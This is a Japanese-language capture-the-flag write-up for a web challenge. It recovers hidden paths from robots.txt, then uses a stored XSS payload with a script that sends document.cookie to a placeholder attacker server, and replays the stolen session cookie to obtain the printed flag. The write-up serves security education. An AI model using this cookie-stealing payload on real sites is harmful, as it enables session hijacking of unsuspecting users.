# Wallowing Wallabies - Part One
Category: Web  
Point: 25

## Question
Wallowing Wallabies provides enterprise contract management - we'd like to find out how easy it is to perform corporate espionage against them. Visit them [here](https://wallowing-wallabies.ctfcompetition.com/).

**Please note** Please do not run automated scanners against the target - that's not the intended solution. Instead, perhaps look up "xss cookie catching", "xss cookie stealing" and other documents along those lines. Thanks!

## FLAG
`CTF{feeling_robbed_of_your_cookies}`

## Answer
ページにアクセスすると，1995年のようなWebサイトが表示される．
問題文からも察せるように，恐らくどこかにXSSの脆弱性があり，そこをついてCookieを奪取する必要があると思われる．

色々探しに探した結果，灯台下暗しともいうべきか，robots.txtに鍵となる情報が隠されていた．
```bash
$ curl https://wallowing-wallabies.ctfcompetition.com/robots.txt
User-agent: *
Disallow: /deep-blue-sea/
Disallow: /deep-blue-sea/team/
# Yes, these are alphabet puns :)
Disallow: /deep-blue-sea/team/characters
Disallow: /deep-blue-sea/team/paragraphs
Disallow: /deep-blue-sea/team/lines
Disallow: /deep-blue-sea/team/runes
Disallow: /deep-blue-sea/team/vendors
```

`/deep-blue-sea/team/`以下のうち，意味のあるページにアクセス出来るのは，`/deep-blue-sea/team/vendors`であった．
このページにアクセスすると，外部のスクリプトファイルを読み込むような挙動をするフォームの入力を促される．

このとき，予め，外部からアクセス可能なサーバを用意し，下記のスクリプトファイルを設置する．
```javascript
x = new XMLHttpRequest();
x.open("GET", "http://your-specific-domain-or-ip-address/?cookie=" + document.cookie, true);
x.send();
```
次に，上記のスクリプトファイルを読み込む`<script>`タグを，フォームの入力値に入れたうえで，送信する．
```html
<script src="http://your-specific-domain-or-ip-address/external.js">
```

すると，上記スクリプトファイルで指定したサーバに，Cookieの値が付加された状態でアクセスがくる．
指定したサーバのWebサーバのアクセスログを確認すると，Cookieの情報が載っている．
`?cookie=green-mountains=eyJub25jZSI6ImZmM2NmZThkMjQ4Mzg5MjYiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9ycy4qJCIsImV4cGlyeSI6MTQ2MjEyMDQ1NH0=|1462120451|a424c4a7d272d408076dc784765a0dba80fea0dd`

`|`で三区分された一つ目の文字列は，Base64エンコードされていることが自明なので，デコードしてみる．
```bash
$ echo 'eyJub25jZSI6ImZmM2NmZThkMjQ4Mzg5MjYiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9ycy4qJCIsImV4cGlyeSI6MTQ2MjEyMDQ1NH0=' | base64 -D
{"nonce":"ff3cfe8d24838926","allowed":"^/deep-blue-sea/team/vendors.*$","expiry":1462120454}
```
デコード結果より，`allowed`で指定されたページが関係していそうだと判明する．
上記のCookieの値をセットして，`vendors`ページをリフレッシュすると，フラグが表示される．

## Author
GitHub: @asakasa
